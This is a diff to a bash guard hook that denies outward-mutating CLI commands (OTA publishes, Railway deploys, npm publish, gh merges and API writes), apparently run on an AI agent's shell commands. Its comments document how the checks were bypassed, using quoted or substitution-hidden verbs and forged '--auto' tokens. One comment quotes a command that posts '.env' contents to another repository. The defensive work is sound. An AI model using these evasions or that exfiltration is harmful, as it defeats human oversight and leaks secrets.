@@ -324,7 +324,7 @@ _OUT_POS_SUFFIX_MERGE_CLAUSE='([[:space:]][^;&|)`{}]*|[);&|`{}]|$)'
 _OUT_REPO_FLAG_RE='(^|[^-A-Za-z0-9])(--repo([^-A-Za-z0-9]|$)|-R)'
 
 # gh_pr_clause_has_repo <subcommand-alternation> → exit 0 if the FIRST
-# `gh pr <sub>` clause in $WORDS carries --repo/-R.
+# `gh pr <sub>` clause in $WORDS_DEEP carries --repo/-R.
 #
 # CLAUSE-SCOPED, unlike the `--admin` check below: `--admin` survives a whole-command
 # scan because it is a rare token, but `-R` is `cp -R`, `grep -R`, `ls -R`,
@@ -343,17 +343,20 @@ _OUT_REPO_FLAG_RE='(^|[^-A-Za-z0-9])(--repo([^-A-Za-z0-9]|$)|-R)'
 # free to silently inspect a benign FIRST create/comment clause while a
 # malicious `--repo` clause sat unexamined in a second one — unbounded PAT
 # egress (review round 4, 2026-08-17).
-# Cuts from $WORDS so the clause is found for the SAME spellings the detector
-# above matches. Left on raw $CMD it silently returned an empty clause — and
-# therefore ALLOWED — for `gh pr "create" --repo other/org`, unbounded PAT egress
-# to an arbitrary repo (review, 2026-08-16). $WORDS loses nothing this check
-# needs: quote characters are already deleted, so a quoted `"--repo"` or
-# `-R "other/org"` is still visible, while a MENTION inside a span collapses to
-# one token (`--title usex--repoxcarefully`) whose `--repo` no longer sits at a
-# token boundary and so cannot false-match.
+# Cuts from $WORDS_DEEP (not raw $CMD) so the clause is found for the SAME
+# spellings the caller's occurrence count matches, INCLUDING one hidden inside
+# a live command substitution. Left on raw $CMD it silently returned an empty
+# clause — and therefore ALLOWED — for `gh pr "create" --repo other/org`,
+# unbounded PAT egress to an arbitrary repo (review, 2026-08-16). $WORDS_DEEP
+# loses nothing this check needs: quote characters are already deleted, so a
+# quoted `"--repo"` or `-R "other/org"` is still visible, while a MENTION
+# inside a span collapses to one token (`--title usex--repoxcarefully`) whose
+# `--repo` no longer sits at a token boundary and so cannot false-match. Deep,
+# not shallow, is SAFE here (unlike the `gh pr merge --auto` CLAUSE below):
+# `--repo`/`-R` only ever ADDS a deny, it never grants a carve-out.
 gh_pr_clause_has_repo() {
   local clause
-  clause=$(printf '%s' "$WORDS" | grep -oiE "gh[[:space:]]+pr[[:space:]]+($1)[^;&|]*" | head -1)
+  clause=$(printf '%s' "$WORDS_DEEP" | grep -oiE "gh[[:space:]]+pr[[:space:]]+($1)[^;&|]*" | head -1)
   [ -n "$clause" ] && grep -Eq "$_OUT_REPO_FLAG_RE" <<< "$clause"
 }
 
@@ -522,8 +525,7 @@ BARE=$(printf '%s' "$CMD" | cmd_bare)
 # WORDS is the argv-faithful rendering (lib/cmd-detect.sh): quote characters
 # deleted so `eas "update"` / `eas up"date"` read as the `eas update` the shell
 # actually builds, with separators INSIDE a span neutralised so a `;` in a commit
-# message still cannot open a command position. Every INVOCATION pattern below
-# matches $WORDS, and so do both carve-out blocks. $BARE survives for exactly ONE
+# message still cannot open a command position. $BARE survives for exactly ONE
 # job, in the blank-rendering detector just below: a wholly-quoted command
 # (`'eas update'`) BLANKS to nothing under cmd_bare while cmd_words renders it as
 # a single word, and that difference is what routes it to the crude smell test
@@ -531,6 +533,15 @@ BARE=$(printf '%s' "$CMD" | cmd_bare)
 # without deleting that detector's $BARE half too, and see the
 # "wholly-quoted command" assertions in test-guard-outward-cli.sh, which exist
 # precisely so that deletion goes red.
+#
+# UPDATED (todo P1-2026-08-17-quoted-command-substitution-inert, archived):
+# every INVOCATION pattern below now matches $WORDS_DEEP (defined further
+# down, right after this file's own broken-awk empty check), NOT plain
+# $WORDS — $WORDS_DEEP additionally surfaces a verb hidden inside a LIVE
+# command substitution, which plain cmd_words still (correctly, for its OTHER
+# consumers) renders as an opaque quoted token. The ONE exception is the
+# `gh pr merge --auto` carve-out's $CLAUSE extraction, which deliberately
+# stays on plain $WORDS — see the CLAUSE assignment's own comment.
 WORDS=$(printf '%s' "$CMD" | cmd_words)
 
 # `declare -F cmd_bare` above proves the function is DEFINED, not that it
@@ -553,6 +564,28 @@ if { [[ ! "$BARE" =~ [^[:space:]] ]] || [[ ! "$WORDS" =~ [^[:space:]] ]]; } \
   fi
   exit 0
 fi
+
+# WORDS_DEEP additionally surfaces a verb hidden inside a LIVE (unquoted or
+# double-quoted) $(...)/backtick command substitution — see lib/cmd-detect.sh's
+# cmd_words_deep for the mechanism and
+# docs/solutions/logic-errors/quoted-command-substitution-always-executes-2026-08-17.md
+# for the bug this closes: `echo "$(eas update --branch preview --platform
+# all)"` genuinely executes regardless of the surrounding double quotes, and
+# plain $WORDS blanked it to an opaque token, same as any other quoted DATA.
+#
+# COMPUTED AFTER the empty-rendering check above, deliberately: WORDS_DEEP's
+# own emptiness is not independently checked here — it is derived from the
+# SAME awk backend already proven working by that check (cmd_words_deep calls
+# plain cmd_words first, unconditionally), so a broken awk is already caught
+# before this line ever runs.
+#
+# USED ONLY BY DENY-SHAPED / OCCURRENCE-COUNTING checks below, never by
+# $WORDS's ONE grant-shaped consumer (the `gh pr merge --auto` carve-out's
+# $CLAUSE extraction, further down) — see lib/cmd-detect.sh's cmd_words_deep
+# header for why unioning substitution content into a GRANT-shaped read would
+# be a deny→allow regression worse than the bug being fixed. $WORDS itself
+# stays completely unmodified so that one read keeps its existing contract.
+WORDS_DEEP=$(cmd_words_deep "$CMD")
 
 # Dual-rendering flag scan, for DENY-ONLY checks. One pattern, both renderings,
 # because each hides a spelling the other shows: a quoted VALUE (`--auto
@@ -590,21 +623,21 @@ $WORDS"; }
 
 # --- eas -------------------------------------------------------------------
 # eas update/publish/submit (space-separated subcommand).
-if grep -Eqi "${_OUT_POS_PREFIX}eas[[:space:]]+(update|publish|submit)${_OUT_POS_SUFFIX}" <<< "$WORDS"; then
+if grep -Eqi "${_OUT_POS_PREFIX}eas[[:space:]]+(update|publish|submit)${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP"; then
   deny "guard-outward-cli: command-position 'eas update/publish/submit' publishes an OTA update or app-store submission — the exact class of the 2026-08-16 accidental-OTA incident. Read-only forms (eas update:list, eas update:view, eas whoami, ...) are unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
 fi
 # eas update:* MUTATING colon subcommands — verified against `eas update
 # --help` (eas-cli 20.1.0); see the header's DOCUMENTED RESIDUALS entry for
 # the verified-read-only counterpart (update:list/view/insights, unaffected
 # by this pattern since the colon puts them outside this alternation).
-if grep -Eqi "${_OUT_POS_PREFIX}eas[[:space:]]+update:(delete|edit|republish|revert-update-rollout|roll-back-to-embedded|rollback)${_OUT_POS_SUFFIX}" <<< "$WORDS"; then
+if grep -Eqi "${_OUT_POS_PREFIX}eas[[:space:]]+update:(delete|edit|republish|revert-update-rollout|roll-back-to-embedded|rollback)${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP"; then
   deny "guard-outward-cli: command-position 'eas update:delete/edit/republish/revert-update-rollout/roll-back-to-embedded/rollback' mutates what OTA update end users receive — the same incident class as bare 'eas update'. Read-only colon forms (eas update:list, eas update:view, eas update:insights) are unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
 fi
 # eas channel:*/branch:* MUTATING colon subcommands — a channel repoint or a
 # branch delete changes which update end users receive, an effect identical to
 # the already-denied `eas update:*` forms (review round 3 found all of these
 # ALLOWED). Read-only `:list`/`:view` forms stay allowed.
-if grep -Eqi "${_OUT_POS_PREFIX}eas[[:space:]]+(channel|branch):(create|edit|delete|rename)${_OUT_POS_SUFFIX}" <<< "$WORDS"; then
+if grep -Eqi "${_OUT_POS_PREFIX}eas[[:space:]]+(channel|branch):(create|edit|delete|rename)${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP"; then
   deny "guard-outward-cli: command-position 'eas channel:/branch: create/edit/delete/rename' repoints or deletes the channel/branch that decides which OTA update end users receive — the same effect class as 'eas update'. Read-only forms (eas channel:list, eas branch:view, ...) are unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
 fi
 # `eas build --auto-submit` (and --auto-submit-with-profile) submits the
@@ -613,7 +646,7 @@ fi
 # Flag scan via scan_both (see its definition for why both renderings are read
 # and why they must stay newline-joined). No trailing boundary, so
 # `--auto-submit-with-profile` is caught by the same pattern.
-if grep -Eqi "${_OUT_POS_PREFIX}eas[[:space:]]+build${_OUT_POS_SUFFIX}" <<< "$WORDS" \
+if grep -Eqi "${_OUT_POS_PREFIX}eas[[:space:]]+build${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP" \
    && scan_both '(^|[^-A-Za-z0-9])--auto-submit'; then
   deny "guard-outward-cli: command-position 'eas build --auto-submit' submits the finished binary to the app store — an outward mutation, not just a build. Plain 'eas build' is unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
 fi
@@ -623,22 +656,22 @@ fi
 # live service's env injected — including the production DATABASE_URL (this
 # repo's own prod backfill/seed docs use exactly that shape), so it is at least
 # as outward as `railway up`.
-if grep -Eqi "${_OUT_POS_PREFIX}railway[[:space:]]+(up|deploy|redeploy|restart|down|delete|remove|rm|run)${_OUT_POS_SUFFIX}" <<< "$WORDS"; then
+if grep -Eqi "${_OUT_POS_PREFIX}railway[[:space:]]+(up|deploy|redeploy|restart|down|delete|remove|rm|run)${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP"; then
   deny "guard-outward-cli: command-position 'railway up/deploy/redeploy/restart/down/delete/remove/rm/run' mutates a live Railway service ('railway run' executes an arbitrary command with the LIVE service env, incl. the production DATABASE_URL). Read-only forms (railway status, railway logs, railway whoami, ...) are unaffected. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
 fi
 # railway variable set/delete (production secrets/env vars) and
 # service/environment delete — a level deeper than the top-level verbs
 # above, and at least as dangerous (an overwritten secret or a deleted
 # service/environment is not recoverable by a redeploy the way up/down are).
-if grep -Eqi "${_OUT_POS_PREFIX}railway[[:space:]]+(variable|variables|vars|var)[[:space:]]+(set|delete)${_OUT_POS_SUFFIX}" <<< "$WORDS"; then
+if grep -Eqi "${_OUT_POS_PREFIX}railway[[:space:]]+(variable|variables|vars|var)[[:space:]]+(set|delete)${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP"; then
   deny "guard-outward-cli: command-position 'railway variable/vars/var set/delete' mutates a live service's environment variables (may include production secrets). Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
 fi
-if grep -Eqi "${_OUT_POS_PREFIX}railway[[:space:]]+(service|environment)[[:space:]]+delete${_OUT_POS_SUFFIX}" <<< "$WORDS"; then
+if grep -Eqi "${_OUT_POS_PREFIX}railway[[:space:]]+(service|environment)[[:space:]]+delete${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP"; then
   deny "guard-outward-cli: command-position 'railway service/environment delete' deletes a live Railway service or environment. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
 fi
 
 # --- npm publish -------------------------------------------------------------
-if grep -Eqi "${_OUT_POS_PREFIX}npm[[:space:]]+publish${_OUT_POS_SUFFIX}" <<< "$WORDS"; then
+if grep -Eqi "${_OUT_POS_PREFIX}npm[[:space:]]+publish${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP"; then
   deny "guard-outward-cli: command-position 'npm publish' pushes a package to the registry. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
 fi
 
@@ -683,23 +716,27 @@ fi
 # is fail-CLOSED on a command essentially nobody writes, and the plain
 # no-flag form (`npm run build update:preview`) still ALLOWS — pinned both ways.
 _OUT_FLAG_RUN='([[:space:]]+-{1,2}[^[:space:]]*([[:space:]]+[^-[:space:]][^[:space:]]*)?)*[[:space:]]+'
-if grep -Eqi "${_OUT_POS_PREFIX}(npm|pnpm|yarn)${_OUT_FLAG_RUN}(run-script|run)${_OUT_FLAG_RUN}update:(preview|production)${_OUT_POS_SUFFIX}" <<< "$WORDS" \
-   || grep -Eqi "${_OUT_POS_PREFIX}(yarn|pnpm)${_OUT_FLAG_RUN}update:(preview|production)${_OUT_POS_SUFFIX}" <<< "$WORDS"; then
+if grep -Eqi "${_OUT_POS_PREFIX}(npm|pnpm|yarn)${_OUT_FLAG_RUN}(run-script|run)${_OUT_FLAG_RUN}update:(preview|production)${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP" \
+   || grep -Eqi "${_OUT_POS_PREFIX}(yarn|pnpm)${_OUT_FLAG_RUN}update:(preview|production)${_OUT_POS_SUFFIX}" <<< "$WORDS_DEEP"; then
   deny "guard-outward-cli: command-position 'npm run update:preview/update:production' (and the yarn/pnpm bare-script equivalents) execs 'eas update --branch preview|production --platform all' against the production domain — a real OTA to real users, the exact class of the 2026-08-16 incident. Every OTHER 'npm run <script>' is unaffected. Bypass: ALLOW_OUTWARD_CLI=1 npm run update:preview -- --message \"...\" (one command)."
 fi
 
 # --- gh: bare 'gh pr merge' (see the --auto/--admin carve-out in the header) -
 GH_PR_MERGE_RE="${_OUT_POS_PREFIX}gh[[:space:]]+pr[[:space:]]+merge${_OUT_POS_SUFFIX}"
-# Counted AND clause-scoped on $WORDS, including the --auto carve-out below.
-# That is safe only because a quoted span is ONE WORD there: `-b "use --auto
-# next time"` renders as the single token `usex--autoxnextxtime`, which is not
-# `--auto`, so a quoted decoy cannot grant the carve-out. Reading $BARE here
+# The OCCURRENCE COUNT just below is counted on $WORDS_DEEP (so a merge hidden
+# inside a live substitution is not silently invisible to this whole block);
+# the CLAUSE extraction feeding the --auto carve-out further down deliberately
+# stays on plain $WORDS instead — see that assignment's own comment for why
+# the two must diverge. $WORDS's one-quoted-span-is-one-word property is what
+# makes the carve-out check safe: `-b "use --auto next time"` renders as the
+# single token `usex--autoxnextxtime`, which is not `--auto`, so a quoted
+# decoy cannot grant the carve-out. Reading $BARE here
 # instead would make `gh pr "merge" 42` invisible; an earlier revision counted on
 # both and denied when they disagreed, which was strictly worse — equal counts do
 # not prove the two renderings found the SAME occurrence
 # (`gh pr merge"x" 42 --auto; gh pr "merge" 99` counts 1 in each, from different
 # clauses, and read --auto out of the wrong one).
-GH_PR_MERGE_OCCURRENCES=$(printf '%s' "$WORDS" | grep -oiE "$GH_PR_MERGE_RE" | wc -l | tr -d '[:space:]')
+GH_PR_MERGE_OCCURRENCES=$(printf '%s' "$WORDS_DEEP" | grep -oiE "$GH_PR_MERGE_RE" | wc -l | tr -d '[:space:]')
 if [ "${GH_PR_MERGE_OCCURRENCES:-0}" -gt 1 ]; then
   deny "guard-outward-cli: more than one command-position 'gh pr merge' occurrence — ambiguous, cannot verify each carries --auto. Denying is the safe direction for a deny gate. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
 elif [ "${GH_PR_MERGE_OCCURRENCES:-0}" -eq 1 ]; then
@@ -709,6 +746,31 @@ elif [ "${GH_PR_MERGE_OCCURRENCES:-0}" -eq 1 ]; then
   if gh_pr_clause_has_repo 'merge'; then
     deny "guard-outward-cli: 'gh pr merge' with --repo/-R targets a DIFFERENT GitHub repository with the user's PAT — outside the --auto carve-out, which exists only for this repo's own /todo automerge pipeline (it never passes --repo). Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
   fi
+  # DELIBERATELY reads plain $WORDS here, not $WORDS_DEEP, even though the
+  # occurrence count just above is deep — this is the ONE grant-shaped read in
+  # this file (HAS_REAL_AUTO below GRANTS the carve-out on a real --auto, it
+  # does not just add a deny), and cmd_words_deep's own header documents why a
+  # grant-shaped check must never read it: a decoy substitution manufacturing
+  # `--auto` as an unrelated invocation's own token must never be read as
+  # satisfying THIS command's carve-out. Net effect when the one counted
+  # occurrence is itself hidden inside a substitution: CLAUSE comes back empty
+  # (nothing on the shallow line matches "gh pr merge"), HAS_REAL_AUTO stays
+  # "no", and the merge is denied — the safe direction, not a bypass. A
+  # substitution-hidden `gh pr merge <n> --auto` (a genuinely self-contained,
+  # really-executing invocation that DOES carry a real --auto) is therefore a
+  # documented, conservative residual: denied rather than allowed, same as
+  # every other "cannot verify --auto" case this check already denies today.
+  #
+  # MERGE RESOLUTION 2026-09-03 (integration of PR #910 with PR #912): both
+  # PRs rewrote this CLAUSE line. They AGREE on the source (`$WORDS`, shallow
+  # — for the grant-shaped reason documented immediately above, which PR #910
+  # did not change) and differ only in the clause-cut suffix, where PR #910's
+  # `_OUT_POS_SUFFIX_MERGE_CLAUSE` supersedes the older swallowing
+  # `${_OUT_POS_SUFFIX}[^;&|]*` form. Both comment blocks are kept because
+  # they document orthogonal properties of the same line: WHICH TEXT is
+  # scanned (this block) vs. WHERE THE CAPTURED CLAUSE STOPS (the block
+  # below). Contrast GH_API_CLAUSE further down, where the same two PRs
+  # collided on BOTH axes and the resolution had to combine them.
   # `_OUT_POS_SUFFIX` closes the 'merge' match here. It gained `{`/`}` as
   # closers on 2026-09-02 (previously it did not) — the same two closers the
   # lib's `_CMD_POS_SUFFIX` already had (see the COMMAND-POSITION ANCHORS
@@ -837,13 +899,40 @@ elif [ "${GH_PR_MERGE_OCCURRENCES:-0}" -eq 1 ]; then
   # cannot create a bypass) and reject an --auto match whose PRECEDING
   # token is one of them.
   GH_MERGE_VALUE_FLAGS='^(--author-email|--body-file|--body|--match-head-commit|--subject|--comment|--add-assignee|--add-label|--add-project|--add-reviewer|--base|--milestone|--remove-assignee|--remove-label|--remove-project|--remove-reviewer|--title|--repo|-A|-b|-F|-t|-c|-B|-R)$'
-  HAS_REAL_AUTO=$(awk -v flags="$GH_MERGE_VALUE_FLAGS" '
-    { prev = ""
-      for (i = 1; i <= NF; i++) {
-        if ($i == "--auto" && prev !~ flags) { print "yes"; exit }
-        prev = $i
-      }
-    }' <<< "$CLAUSE")
+  # CLAUSE's "one quoted span = one word" invariant — the premise the --auto
+  # scan below depends on — is FALSE when a quoted VALUE contains its own
+  # internal quoting: `-b "$(printf %s "AAA "--auto" BBB")"` renders (via
+  # unmodified cmd_words, which tracks quote state as ONE flat toggle with no
+  # concept that $(...) opens an independent quoting namespace in real bash)
+  # as `-b $xprintfx%sxAAA --auto BBBx` — the internal `"..."` pairs flip that
+  # flat toggle back to "unquoted" mid-span, so the literal spaces around
+  # --auto survive as REAL word boundaries, manufacturing a free-standing
+  # --auto token that is NOT a real argv word (confirmed: `gh(){ for a in
+  # "$@"; do echo "[$a]"; done; }` on the identical string shows the whole
+  # thing as ONE argv element, "AAA --auto BBB", with no standalone --auto —
+  # bug found by security review, 2026-09-02). Detecting the general case
+  # exactly is out of scope for this fix (it needs cmd_words itself to become
+  # nesting-aware, a materially larger change than this todo's Scope
+  # Contract's narrow substitution-liveness fix) — so, matching this whole
+  # check's existing "cannot verify -> deny" default, ANY literal `$`
+  # surviving in CLAUSE (a legitimate `"$MESSAGE"` variable reference renders
+  # the identical way, since cmd_words never touches a bare `$` either) makes
+  # --auto unverifiable and denies, rather than trusting a token boundary that
+  # may not correspond to a real one. Over-broad in the safe direction: a
+  # real, uncorrupted --auto with a co-occurring unrelated $VAR mention
+  # elsewhere in the same clause now also denies, in exchange for closing the
+  # forged-token bypass. Pinned in test-guard-outward-cli.sh.
+  if printf '%s' "$CLAUSE" | grep -qF '$'; then
+    HAS_REAL_AUTO=no
+  else
+    HAS_REAL_AUTO=$(awk -v flags="$GH_MERGE_VALUE_FLAGS" '
+      { prev = ""
+        for (i = 1; i <= NF; i++) {
+          if ($i == "--auto" && prev !~ flags) { print "yes"; exit }
+          prev = $i
+        }
+      }' <<< "$CLAUSE")
+  fi
   if [ "$HAS_REAL_AUTO" != "yes" ]; then
     deny "guard-outward-cli: command-position 'gh pr merge' without a REAL --auto flag merges a PR immediately. A '--auto' token consumed as the VALUE of a preceding value-taking flag (--body/-b, --body-file/-F, --subject/-t, --author-email/-A, --match-head-commit/-c, --repo/-R, ...) does not count as --auto. 'gh pr merge --auto ...' (this repo's sanctioned /todo automerge mechanism) stays allowed — branch protection still gates the actual merge. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
   fi
@@ -878,7 +967,7 @@ fi
 # --- gh: other mutating subcommands (pr create/comment allowed only without
 #     --repo/-R, see the header) -------------------------------------------
 GH_MUTATING_RE="${_OUT_POS_PREFIX}gh[[:space:]]+(pr[[:space:]]+(close|edit|ready|reopen|review|lock|unlock|update-branch|revert)|release[[:space:]]+(create|delete|delete-asset|edit|upload)|repo[[:space:]]+(create|delete|archive|unarchive|edit|rename|sync|fork))${_OUT_POS_SUFFIX}"
-if grep -Eqi "$GH_MUTATING_RE" <<< "$WORDS"; then
+if grep -Eqi "$GH_MUTATING_RE" <<< "$WORDS_DEEP"; then
   deny "guard-outward-cli: command-position mutating 'gh pr/release/repo' subcommand. Read-only forms (gh pr view/checks/list, gh release view/list, gh repo view/list, ...) are unaffected; gh pr create/comment are deliberately allowed (routine PR workflow) unless retargeted with --repo/-R. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
 fi
 
@@ -887,7 +976,7 @@ fi
 # arbitrary GitHub repository with the user's PAT (`gh pr comment --repo
 # other/org --body "$(cat .env)"` was ALLOWED, review round 3). Same treatment
 # lib/cmd-detect.sh:242 already gives the flag, and this repo's own PR flow
-# never passes it. Clause-scoped $WORDS flag scan — see gh_pr_clause_has_repo.
+# never passes it. Clause-scoped $WORDS_DEEP flag scan — see gh_pr_clause_has_repo.
 #
 # COUNTED, matching the gh pr merge treatment above (review round 4,
 # 2026-08-17): gh_pr_clause_has_repo's `head -1` only ever inspects the FIRST
@@ -897,7 +986,7 @@ fi
 # create --repo other/org --title x` was ALLOWED). Deny outright on >1
 # occurrence rather than guess which clause to inspect.
 GH_PR_CREATE_RE="${_OUT_POS_PREFIX}gh[[:space:]]+pr[[:space:]]+(create|comment)${_OUT_POS_SUFFIX}"
-GH_PR_CREATE_OCCURRENCES=$(printf '%s' "$WORDS" | grep -oiE "$GH_PR_CREATE_RE" | wc -l | tr -d '[:space:]')
+GH_PR_CREATE_OCCURRENCES=$(printf '%s' "$WORDS_DEEP" | grep -oiE "$GH_PR_CREATE_RE" | wc -l | tr -d '[:space:]')
 if [ "${GH_PR_CREATE_OCCURRENCES:-0}" -gt 1 ]; then
   deny "guard-outward-cli: more than one command-position 'gh pr create/comment' occurrence — ambiguous, cannot verify each is free of --repo/-R. Denying is the safe direction for a deny gate. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
 elif [ "${GH_PR_CREATE_OCCURRENCES:-0}" -eq 1 ] && gh_pr_clause_has_repo 'create|comment'; then
@@ -912,15 +1001,25 @@ fi
 # api` usage (scripts/todo-automerge-guard.sh, .claude/skills/land/SKILL.md —
 # both GET, gh api's own default with no -X/--method), which a blanket `gh
 # api` deny would break.
-# NOTE: this block reads $WORDS throughout — occurrence count AND clause cut.
-# It used to read $BARE, where a QUOTED method value (`gh api -X "POST" …`) was
-# invisible because cmd_bare blanks quoted CONTENT; that was a documented
-# residual and is now closed, since $WORDS has already dropped the quote
-# characters. Do NOT "fix" this by scanning raw $CMD: that was tried and it
-# loses BOTH the command-position anchor and the separator neutralisation with
-# it, so `echo "gh api docs" && gh api -X POST …` cut its clause from the decoy
-# and `-f 'title=a|b'` truncated the clause at a quoted pipe — each an ALLOW on
-# a production merge.
+# NOTE: this block reads $WORDS_DEEP throughout — occurrence count AND clause
+# cut. It used to read $BARE, where a QUOTED method value (`gh api -X "POST"
+# …`) was invisible because cmd_bare blanks quoted CONTENT; that was a
+# documented residual and is now closed, since $WORDS_DEEP has already dropped
+# the quote characters. Do NOT "fix" this by scanning raw $CMD: that was tried
+# and it loses BOTH the command-position anchor and the separator
+# neutralisation with it, so `echo "gh api docs" && gh api -X POST …` cut its
+# clause from the decoy and `-f 'title=a|b'` truncated the clause at a quoted
+# pipe — each an ALLOW on a production merge.
+# DEEP, not shallow ($WORDS), is required here (unlike the `gh pr merge --auto`
+# CLAUSE above): this block ALLOWS by default and only denies on affirmative
+# evidence of a mutating method, so an EMPTY clause would silently ALLOW — the
+# opposite failure mode from the merge block's "empty clause denies" shape. A
+# `gh api -X POST …` hidden inside a live command substitution would have an
+# empty clause on plain $WORDS and slip through undenied unless the clause
+# cut, not just the occurrence count, also reads the deep union. Safe to
+# widen regardless: this method scan is pure DENY-shaped (no flag here GRANTS
+# anything), so it carries none of the grant-shaped hazard the CLAUSE comment
+# above documents.
 # More than one command-position `gh api` occurrence is ambiguous — the
 # ORIGINAL round-2 version used `head -1` and silently ignored every
 # occurrence after the first, which let a read-only first call shadow a
@@ -928,20 +1027,22 @@ fi
 # ALLOWED). Deny on >1, mirroring the identical multi-occurrence safe
 # direction the `gh pr merge` check above already takes.
 GH_API_RE="${_OUT_POS_PREFIX}gh[[:space:]]+api${_OUT_POS_SUFFIX}"
-# Counted AND clause-scoped on $WORDS, like the `gh pr merge` block above. This
-# check ALLOWS by default (a read-only `gh api` is fine) and only denies once it
-# reads a mutating method out of the clause, so a quoted command word
+# Counted AND clause-scoped on $WORDS_DEEP (unlike the `gh pr merge` block
+# above, whose CLAUSE stays shallow — see that block's own comment for why).
+# This check ALLOWS by default (a read-only `gh api` is fine) and only denies
+# once it reads a mutating method out of the clause, so a quoted command word
 # (`gh "api" -X PUT …`) invisible to the rendering would fall through to ALLOW.
-# Reading $WORDS makes the quoted spellings visible without resorting to raw
-# $CMD, which would lose the command-position anchor and the separator
-# neutralisation with it.
-GH_API_OCCURRENCES=$(printf '%s' "$WORDS" | grep -oiE "$GH_API_RE" | wc -l | tr -d '[:space:]')
+# Reading $WORDS_DEEP makes the quoted spellings AND a live-substitution-hidden
+# occurrence visible, without resorting to raw $CMD, which would lose the
+# command-position anchor and the separator neutralisation with it.
+GH_API_OCCURRENCES=$(printf '%s' "$WORDS_DEEP" | grep -oiE "$GH_API_RE" | wc -l | tr -d '[:space:]')
 if [ "${GH_API_OCCURRENCES:-0}" -gt 1 ]; then
   deny "guard-outward-cli: more than one command-position 'gh api' occurrence — ambiguous, cannot verify each is read-only. Denying is the safe direction for a deny gate. Bypass: ALLOW_OUTWARD_CLI=1 (one command)."
 elif [ "${GH_API_OCCURRENCES:-0}" -eq 1 ]; then
-  # Cut from $WORDS, keeping the command-position ANCHOR and the `[^;&|]*`
-  # clause bound. $WORDS is what makes the quoted-flag-value spellings visible
-  # WITHOUT resorting to raw $CMD: the quote characters are already gone, so
+  # Cut from $WORDS_DEEP, keeping the command-position ANCHOR and the
+  # `[^;&|]*` clause bound. $WORDS_DEEP is what makes the quoted-flag-value
+  # spellings visible WITHOUT resorting to raw $CMD: the quote characters are
+  # already gone, so
   # `-X "PUT"` reads as `-X PUT` and `-X"PUT"` as `-XPUT`, both matched by the
   # existing pattern. An earlier revision scanned raw $CMD instead and lost both
   # the anchor and the separator-neutralisation with it — `echo "gh api docs" &&
@@ -968,7 +1069,23 @@ elif [ "${GH_API_OCCURRENCES:-0}" -eq 1 ]; then
   # a detector widened without its sibling consumer. Two-sided regression
   # test: test-guard-outward-cli.sh's "2026-09-02 FIX (round 2)" block (RED
   # against the pre-fix literal-space clause regex, GREEN after).
-  GH_API_CLAUSE=$(printf '%s' "$WORDS" | grep -oiE "${_OUT_POS_PREFIX}gh[[:space:]]+api${_OUT_POS_SUFFIX}[^;&|]*" | head -1)
+  #
+  # MERGE RESOLUTION 2026-09-03 (integration of PR #910 with PR #912): these
+  # two PRs each changed THIS ONE LINE, on different axes, and neither side
+  # alone is correct:
+  #   - PR #912 changed the SOURCE `$WORDS` -> `$WORDS_DEEP` (deep
+  #     substitution scan), which is what the unconflicted comment block
+  #     immediately above already documents this cut as reading.
+  #   - PR #910 changed the SUFFIX literal `[[:space:]]` -> `${_OUT_POS_SUFFIX}`
+  #     (the round-2 fix described just above).
+  # Taking PR #910's line verbatim would have silently reverted #912's deep
+  # read while the comment above still claimed it; taking #912's line verbatim
+  # would have silently reverted the `{`/`}` boundary fix and reopened the
+  # confirmed-live `gh api{,x} -X POST` bypass. Both changes are kept. This is
+  # safe for THIS clause specifically because it is DENY-shaped (over-capture
+  # can only ever ADD a deny) — unlike the grant-shaped `gh pr merge` CLAUSE
+  # above, which must stay on shallow `$WORDS` for the reason documented there.
+  GH_API_CLAUSE=$(printf '%s' "$WORDS_DEEP" | grep -oiE "${_OUT_POS_PREFIX}gh[[:space:]]+api${_OUT_POS_SUFFIX}[^;&|]*" | head -1)
   # Matches BOTH the spaced/`=` form (-X POST, -X=POST, --method POST,
   # --method=POST) AND the glued short-flag form (-XPOST — the common
   # curl-style spelling; found bypassing a separator-only pattern in review
